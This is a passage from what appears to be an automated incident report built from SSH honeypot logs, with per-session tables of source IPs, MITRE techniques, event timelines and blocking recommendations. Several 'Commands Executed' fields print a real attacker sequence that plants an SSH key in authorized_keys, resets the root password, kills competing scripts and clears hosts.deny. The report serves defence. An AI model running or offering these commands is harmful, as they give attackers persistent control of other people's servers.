| `2026-06-11 13:41:10` | `cowrie.session.file_download` |
| `2026-06-11 13:41:10` | `cowrie.log.closed` |
| `2026-06-11 13:41:21` | `cowrie.session.params` |
| `2026-06-11 13:41:21` | `cowrie.command.input` |
| `2026-06-11 13:41:22` | `cowrie.log.closed` |
| `2026-06-11 13:41:23` | `cowrie.session.params` |
| `2026-06-11 13:41:23` | `cowrie.command.input` |
| `2026-06-11 13:41:23` | `cowrie.log.closed` |
| `2026-06-11 13:41:24` | `cowrie.session.params` |
| `2026-06-11 13:41:24` | `cowrie.command.input` |
| `2026-06-11 13:41:25` | `cowrie.session.file_download` |
| `2026-06-11 13:41:25` | `cowrie.log.closed` |
| `2026-06-11 13:41:26` | `cowrie.session.params` |
| `2026-06-11 13:41:26` | `cowrie.command.input` |
| `2026-06-11 13:41:26` | `cowrie.log.closed` |
| `2026-06-11 13:41:49` | `cowrie.session.params` |
| `2026-06-11 13:41:49` | `cowrie.command.input` |
| `2026-06-11 13:41:49` | `cowrie.log.closed` |
| `2026-06-11 13:41:49` | `cowrie.session.params` |
| `2026-06-11 13:41:49` | `cowrie.command.input` |
| `2026-06-11 13:41:50` | `cowrie.log.closed` |
| `2026-06-11 13:41:50` | `cowrie.session.params` |
| `2026-06-11 13:41:50` | `cowrie.command.input` |
| `2026-06-11 13:41:50` | `cowrie.log.closed` |
| `2026-06-11 13:41:50` | `cowrie.session.params` |
| `2026-06-11 13:41:50` | `cowrie.command.input` |
| `2026-06-11 13:41:50` | `cowrie.log.closed` |
| `2026-06-11 13:41:51` | `cowrie.session.params` |
| `2026-06-11 13:41:51` | `cowrie.command.input` |
| `2026-06-11 13:41:51` | `cowrie.log.closed` |
| `2026-06-11 13:41:51` | `cowrie.session.params` |
| `2026-06-11 13:41:51` | `cowrie.command.input` |
| `2026-06-11 13:41:51` | `cowrie.log.closed` |
| `2026-06-11 13:41:52` | `cowrie.session.params` |
| `2026-06-11 13:41:52` | `cowrie.command.input` |
| `2026-06-11 13:41:52` | `cowrie.log.closed` |
| `2026-06-11 13:41:52` | `cowrie.session.params` |
| `2026-06-11 13:41:52` | `cowrie.command.input` |
| `2026-06-11 13:41:52` | `cowrie.log.closed` |
| `2026-06-11 13:41:53` | `cowrie.session.params` |
| `2026-06-11 13:41:53` | `cowrie.command.input` |
| `2026-06-11 13:41:53` | `cowrie.log.closed` |
| `2026-06-11 13:41:53` | `cowrie.session.params` |
| `2026-06-11 13:41:53` | `cowrie.command.input` |
| `2026-06-11 13:41:53` | `cowrie.log.closed` |
| `2026-06-11 13:41:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.78.60[.]105` to AbuseIPDB if not already reported
- [ ] Block `218.78.60[.]105` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e99d77c7406

| Field | Detail |
|---|---|
| **Source IP** | `218.78.60[.]105` |
| **First Seen** | 2026-06-11 13:50 |
| **Last Seen** | 2026-06-11 13:50 |
| **Session Duration** | 48s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:mxzK6vBV9yrp"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 13:50:01` | `cowrie.session.connect` |
| `2026-06-11 13:50:01` | `cowrie.client.version` |
| `2026-06-11 13:50:03` | `cowrie.client.kex` |
| `2026-06-11 13:50:04` | `cowrie.login.success` |
| `2026-06-11 13:50:10` | `cowrie.session.params` |
| `2026-06-11 13:50:10` | `cowrie.command.input` |
| `2026-06-11 13:50:10` | `cowrie.command.failed` |
| `2026-06-11 13:50:11` | `cowrie.log.closed` |
| `2026-06-11 13:50:11` | `cowrie.session.params` |
| `2026-06-11 13:50:11` | `cowrie.command.input` |
| `2026-06-11 13:50:11` | `cowrie.session.file_download` |
| `2026-06-11 13:50:11` | `cowrie.log.closed` |
| `2026-06-11 13:50:30` | `cowrie.session.params` |
| `2026-06-11 13:50:30` | `cowrie.command.input` |
| `2026-06-11 13:50:30` | `cowrie.log.closed` |
| `2026-06-11 13:50:33` | `cowrie.session.params` |
| `2026-06-11 13:50:33` | `cowrie.command.input` |
| `2026-06-11 13:50:34` | `cowrie.log.closed` |
| `2026-06-11 13:50:40` | `cowrie.session.params` |
| `2026-06-11 13:50:40` | `cowrie.command.input` |
| `2026-06-11 13:50:40` | `cowrie.session.file_download` |
| `2026-06-11 13:50:40` | `cowrie.log.closed` |
| `2026-06-11 13:50:41` | `cowrie.session.params` |
| `2026-06-11 13:50:41` | `cowrie.command.input` |
| `2026-06-11 13:50:42` | `cowrie.log.closed` |
| `2026-06-11 13:50:43` | `cowrie.session.params` |
| `2026-06-11 13:50:43` | `cowrie.command.input` |
| `2026-06-11 13:50:43` | `cowrie.log.closed` |
| `2026-06-11 13:50:43` | `cowrie.session.params` |
| `2026-06-11 13:50:43` | `cowrie.command.input` |
| `2026-06-11 13:50:43` | `cowrie.command.input` |
| `2026-06-11 13:50:44` | `cowrie.log.closed` |
| `2026-06-11 13:50:44` | `cowrie.session.params` |
| `2026-06-11 13:50:44` | `cowrie.command.input` |
| `2026-06-11 13:50:44` | `cowrie.log.closed` |
| `2026-06-11 13:50:45` | `cowrie.session.params` |
| `2026-06-11 13:50:45` | `cowrie.command.input` |
| `2026-06-11 13:50:45` | `cowrie.log.closed` |
| `2026-06-11 13:50:46` | `cowrie.session.params` |
| `2026-06-11 13:50:46` | `cowrie.command.input` |
| `2026-06-11 13:50:46` | `cowrie.log.closed` |
| `2026-06-11 13:50:46` | `cowrie.session.params` |
| `2026-06-11 13:50:46` | `cowrie.command.input` |
| `2026-06-11 13:50:46` | `cowrie.log.closed` |
| `2026-06-11 13:50:47` | `cowrie.session.params` |
| `2026-06-11 13:50:47` | `cowrie.command.input` |
| `2026-06-11 13:50:47` | `cowrie.log.closed` |
| `2026-06-11 13:50:47` | `cowrie.session.params` |
| `2026-06-11 13:50:47` | `cowrie.command.input` |
| `2026-06-11 13:50:47` | `cowrie.log.closed` |
| `2026-06-11 13:50:48` | `cowrie.session.params` |
| `2026-06-11 13:50:48` | `cowrie.command.input` |
| `2026-06-11 13:50:48` | `cowrie.log.closed` |
| `2026-06-11 13:50:48` | `cowrie.session.params` |
| `2026-06-11 13:50:48` | `cowrie.command.input` |
| `2026-06-11 13:50:48` | `cowrie.log.closed` |
| `2026-06-11 13:50:49` | `cowrie.session.params` |
| `2026-06-11 13:50:49` | `cowrie.command.input` |
| `2026-06-11 13:50:49` | `cowrie.log.closed` |
| `2026-06-11 13:50:49` | `cowrie.session.params` |
| `2026-06-11 13:50:49` | `cowrie.command.input` |
| `2026-06-11 13:50:49` | `cowrie.log.closed` |
| `2026-06-11 13:50:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.78.60[.]105` to AbuseIPDB if not already reported
- [ ] Block `218.78.60[.]105` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae9ba8c74500

| Field | Detail |
|---|---|
| **Source IP** | `218.78.60[.]105` |
| **First Seen** | 2026-06-11 13:55 |
| **Last Seen** | 2026-06-11 13:56 |
| **Session Duration** | 46s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:7nk4ciGcPO2F"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 13:55:40` | `cowrie.session.connect` |
| `2026-06-11 13:55:40` | `cowrie.client.version` |
| `2026-06-11 13:55:41` | `cowrie.client.kex` |
| `2026-06-11 13:55:48` | `cowrie.login.success` |
| `2026-06-11 13:55:49` | `cowrie.session.params` |
| `2026-06-11 13:55:49` | `cowrie.command.input` |
| `2026-06-11 13:55:49` | `cowrie.command.failed` |
| `2026-06-11 13:55:50` | `cowrie.log.closed` |
| `2026-06-11 13:55:51` | `cowrie.session.params` |
| `2026-06-11 13:55:51` | `cowrie.command.input` |
| `2026-06-11 13:55:54` | `cowrie.session.file_download` |
| `2026-06-11 13:55:54` | `cowrie.log.closed` |
| `2026-06-11 13:56:12` | `cowrie.session.params` |
| `2026-06-11 13:56:12` | `cowrie.command.input` |
| `2026-06-11 13:56:12` | `cowrie.log.closed` |
| `2026-06-11 13:56:13` | `cowrie.session.params` |
| `2026-06-11 13:56:13` | `cowrie.command.input` |
| `2026-06-11 13:56:14` | `cowrie.log.closed` |
| `2026-06-11 13:56:15` | `cowrie.session.params` |
| `2026-06-11 13:56:15` | `cowrie.command.input` |
| `2026-06-11 13:56:16` | `cowrie.session.file_download` |
| `2026-06-11 13:56:16` | `cowrie.log.closed` |
| `2026-06-11 13:56:17` | `cowrie.session.params` |
| `2026-06-11 13:56:17` | `cowrie.command.input` |
| `2026-06-11 13:56:18` | `cowrie.log.closed` |
| `2026-06-11 13:56:18` | `cowrie.session.params` |
| `2026-06-11 13:56:18` | `cowrie.command.input` |
| `2026-06-11 13:56:18` | `cowrie.log.closed` |
| `2026-06-11 13:56:19` | `cowrie.session.params` |
| `2026-06-11 13:56:19` | `cowrie.command.input` |
| `2026-06-11 13:56:19` | `cowrie.command.input` |
| `2026-06-11 13:56:19` | `cowrie.log.closed` |
| `2026-06-11 13:56:20` | `cowrie.session.params` |
| `2026-06-11 13:56:20` | `cowrie.command.input` |
| `2026-06-11 13:56:20` | `cowrie.log.closed` |
| `2026-06-11 13:56:21` | `cowrie.session.params` |
| `2026-06-11 13:56:21` | `cowrie.command.input` |
| `2026-06-11 13:56:21` | `cowrie.log.closed` |
| `2026-06-11 13:56:22` | `cowrie.session.params` |
| `2026-06-11 13:56:22` | `cowrie.command.input` |
| `2026-06-11 13:56:22` | `cowrie.log.closed` |
| `2026-06-11 13:56:23` | `cowrie.session.params` |
| `2026-06-11 13:56:23` | `cowrie.command.input` |
| `2026-06-11 13:56:24` | `cowrie.log.closed` |
| `2026-06-11 13:56:24` | `cowrie.session.params` |
| `2026-06-11 13:56:24` | `cowrie.command.input` |
| `2026-06-11 13:56:24` | `cowrie.log.closed` |
| `2026-06-11 13:56:25` | `cowrie.session.params` |
| `2026-06-11 13:56:25` | `cowrie.command.input` |
| `2026-06-11 13:56:26` | `cowrie.log.closed` |
| `2026-06-11 13:56:26` | `cowrie.session.params` |
| `2026-06-11 13:56:26` | `cowrie.command.input` |
| `2026-06-11 13:56:26` | `cowrie.log.closed` |
| `2026-06-11 13:56:26` | `cowrie.session.params` |
| `2026-06-11 13:56:26` | `cowrie.command.input` |
| `2026-06-11 13:56:26` | `cowrie.log.closed` |
| `2026-06-11 13:56:27` | `cowrie.session.params` |
| `2026-06-11 13:56:27` | `cowrie.command.input` |
| `2026-06-11 13:56:27` | `cowrie.log.closed` |
| `2026-06-11 13:56:27` | `cowrie.session.params` |
| `2026-06-11 13:56:27` | `cowrie.command.input` |
| `2026-06-11 13:56:27` | `cowrie.log.closed` |
| `2026-06-11 13:56:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.78.60[.]105` to AbuseIPDB if not already reported
- [ ] Block `218.78.60[.]105` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b953c1cb3e4

| Field | Detail |
|---|---|
| **Source IP** | `51.77.158[.]34` |
| **First Seen** | 2026-06-11 14:15 |
| **Last Seen** | 2026-06-11 14:15 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 14:15:00` | `cowrie.session.connect` |
| `2026-06-11 14:15:00` | `cowrie.client.version` |
| `2026-06-11 14:15:00` | `cowrie.client.kex` |
| `2026-06-11 14:15:01` | `cowrie.login.success` |
| `2026-06-11 14:15:01` | `cowrie.session.params` |
| `2026-06-11 14:15:01` | `cowrie.command.input` |
| `2026-06-11 14:15:01` | `cowrie.command.failed` |
| `2026-06-11 14:15:01` | `cowrie.log.closed` |
| `2026-06-11 14:15:01` | `cowrie.session.params` |
| `2026-06-11 14:15:01` | `cowrie.command.input` |
| `2026-06-11 14:15:02` | `cowrie.session.file_download` |
| `2026-06-11 14:15:02` | `cowrie.log.closed` |
| `2026-06-11 14:15:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.77.158[.]34` to AbuseIPDB if not already reported
- [ ] Block `51.77.158[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf56b58815b6

| Field | Detail |
|---|---|
| **Source IP** | `51.77.158[.]34` |
| **First Seen** | 2026-06-11 14:15 |
| **Last Seen** | 2026-06-11 14:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 14:15:04` | `cowrie.session.connect` |
| `2026-06-11 14:15:04` | `cowrie.client.version` |
| `2026-06-11 14:15:04` | `cowrie.client.kex` |
| `2026-06-11 14:15:04` | `cowrie.login.success` |
| `2026-06-11 14:15:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.77.158[.]34` to AbuseIPDB if not already reported
- [ ] Block `51.77.158[.]34` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d662793e4f2b

| Field | Detail |
|---|---|
| **Source IP** | `103.20.122[.]54` |
| **First Seen** | 2026-06-11 14:21 |
| **Last Seen** | 2026-06-11 14:21 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 14:21:44` | `cowrie.session.connect` |
| `2026-06-11 14:21:44` | `cowrie.client.version` |
| `2026-06-11 14:21:44` | `cowrie.client.kex` |
| `2026-06-11 14:21:44` | `cowrie.login.success` |
| `2026-06-11 14:21:45` | `cowrie.session.params` |
| `2026-06-11 14:21:45` | `cowrie.command.input` |
| `2026-06-11 14:21:45` | `cowrie.command.failed` |
| `2026-06-11 14:21:45` | `cowrie.log.closed` |
| `2026-06-11 14:21:45` | `cowrie.session.params` |
| `2026-06-11 14:21:45` | `cowrie.command.input` |
| `2026-06-11 14:21:45` | `cowrie.session.file_download` |
| `2026-06-11 14:21:45` | `cowrie.log.closed` |
| `2026-06-11 14:21:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.20.122[.]54` to AbuseIPDB if not already reported
- [ ] Block `103.20.122[.]54` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-795943764a61

| Field | Detail |
|---|---|
| **Source IP** | `103.20.122[.]54` |
| **First Seen** | 2026-06-11 14:21 |
| **Last Seen** | 2026-06-11 14:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 14:21:47` | `cowrie.session.connect` |
| `2026-06-11 14:21:47` | `cowrie.client.version` |
| `2026-06-11 14:21:47` | `cowrie.client.kex` |
| `2026-06-11 14:21:47` | `cowrie.login.success` |
| `2026-06-11 14:21:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.20.122[.]54` to AbuseIPDB if not already reported
- [ ] Block `103.20.122[.]54` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a975471e8eac

| Field | Detail |
|---|---|
| **Source IP** | `118.193.61[.]170` |
| **First Seen** | 2026-06-11 14:28 |
| **Last Seen** | 2026-06-11 14:28 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 14:28:26` | `cowrie.session.connect` |
| `2026-06-11 14:28:26` | `cowrie.client.version` |
| `2026-06-11 14:28:26` | `cowrie.client.kex` |
| `2026-06-11 14:28:26` | `cowrie.login.success` |
| `2026-06-11 14:28:27` | `cowrie.session.params` |
| `2026-06-11 14:28:27` | `cowrie.command.input` |
| `2026-06-11 14:28:27` | `cowrie.command.failed` |
| `2026-06-11 14:28:27` | `cowrie.log.closed` |
| `2026-06-11 14:28:27` | `cowrie.session.params` |
| `2026-06-11 14:28:27` | `cowrie.command.input` |
| `2026-06-11 14:28:27` | `cowrie.session.file_download` |
| `2026-06-11 14:28:27` | `cowrie.log.closed` |
| `2026-06-11 14:28:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.61[.]170` to AbuseIPDB if not already reported
- [ ] Block `118.193.61[.]170` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eafb3f08fcdc

| Field | Detail |
|---|---|
| **Source IP** | `118.193.61[.]170` |
| **First Seen** | 2026-06-11 14:28 |
| **Last Seen** | 2026-06-11 14:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 14:28:30` | `cowrie.session.connect` |
| `2026-06-11 14:28:30` | `cowrie.client.version` |
| `2026-06-11 14:28:30` | `cowrie.client.kex` |
| `2026-06-11 14:28:30` | `cowrie.login.success` |
| `2026-06-11 14:28:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.61[.]170` to AbuseIPDB if not already reported
- [ ] Block `118.193.61[.]170` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-366b4e8e8c73

| Field | Detail |
|---|---|
| **Source IP** | `103.20.122[.]54` |
| **First Seen** | 2026-06-11 14:29 |
| **Last Seen** | 2026-06-11 14:29 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 14:29:46` | `cowrie.session.connect` |
| `2026-06-11 14:29:46` | `cowrie.client.version` |
| `2026-06-11 14:29:46` | `cowrie.client.kex` |
| `2026-06-11 14:29:47` | `cowrie.login.success` |
| `2026-06-11 14:29:47` | `cowrie.session.params` |
| `2026-06-11 14:29:47` | `cowrie.command.input` |
| `2026-06-11 14:29:47` | `cowrie.command.failed` |
| `2026-06-11 14:29:47` | `cowrie.log.closed` |
| `2026-06-11 14:29:47` | `cowrie.session.params` |
| `2026-06-11 14:29:47` | `cowrie.command.input` |
| `2026-06-11 14:29:47` | `cowrie.session.file_download` |
| `2026-06-11 14:29:47` | `cowrie.log.closed` |
| `2026-06-11 14:29:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.20.122[.]54` to AbuseIPDB if not already reported
- [ ] Block `103.20.122[.]54` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-370375679020

| Field | Detail |
|---|---|
| **Source IP** | `103.20.122[.]54` |
| **First Seen** | 2026-06-11 14:29 |
| **Last Seen** | 2026-06-11 14:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 14:29:49` | `cowrie.session.connect` |
| `2026-06-11 14:29:49` | `cowrie.client.version` |
| `2026-06-11 14:29:49` | `cowrie.client.kex` |
| `2026-06-11 14:29:49` | `cowrie.login.success` |
| `2026-06-11 14:29:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.20.122[.]54` to AbuseIPDB if not already reported
- [ ] Block `103.20.122[.]54` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-743f7d81d048

| Field | Detail |
|---|---|
| **Source IP** | `14.103.118[.]208` |
| **First Seen** | 2026-06-11 14:37 |
| **Last Seen** | 2026-06-11 14:38 |
| **Session Duration** | 29s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
